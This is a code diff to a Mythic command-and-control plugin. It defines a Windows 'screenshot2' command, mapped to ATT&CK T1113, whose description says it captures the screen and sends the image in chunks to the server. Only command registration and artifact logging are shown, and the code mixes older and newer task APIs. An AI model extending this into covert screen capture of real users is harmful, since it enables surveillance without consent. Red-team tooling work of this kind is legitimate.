@@ -1,22 +1,39 @@
 from mythic_container.MythicCommandBase import *
+import json
 from mythic_container.MythicRPC import *
+from datetime import datetime
+
+class Screenshot2Arguments(TaskArguments):
+    def __init__(self, command_line, **kwargs):
+        super().__init__(command_line, **kwargs)
+        self.args = []
+
+    async def parse_arguments(self):
+        pass
+
 
 class Screenshot2Command(CommandBase):
     cmd = "screenshot2"
     needs_admin = False
     help_cmd = "screenshot2"
-    description = "Captura a tela atual e retorna em base64"
+    description = "Captura de tela no Windows e envia a imagem em chunks para o Mythic."
     version = 1
-    author = "@seuuser"
-    argument_class = CommandArguments
+    author = "willian"
+    parameters = []
+    attackmapping = ["T1113"]
+    argument_class = Screenshot2Arguments
+    browser_script = BrowserScript(script_name="screenshot2", author="willian", for_new_ui=True)
     attributes = CommandAttributes(
-        supported_python_versions=["Python 3.8"],   # ou 2.7 se for compatível
-        supported_os=[SupportedOS.Windows]         # ajuste conforme EyesC
+        supported_os=[SupportedOS.Windows]
     )
 
     async def create_tasking(self, task: MythicTask) -> MythicTask:
-        resp = await MythicRPC().execute("create_output", task_id=task.id, output="Executando screenshot2...")
+        await MythicRPC().execute("create_artifact", task_id=task.id,
+            artifact="user32.PrintWindow / gdi32.BitBlt",
+            artifact_type="API Called",
+        )
         return task
 
-    async def process_response(self, response: AgentResponse):
-        pass
+    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
+        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
+
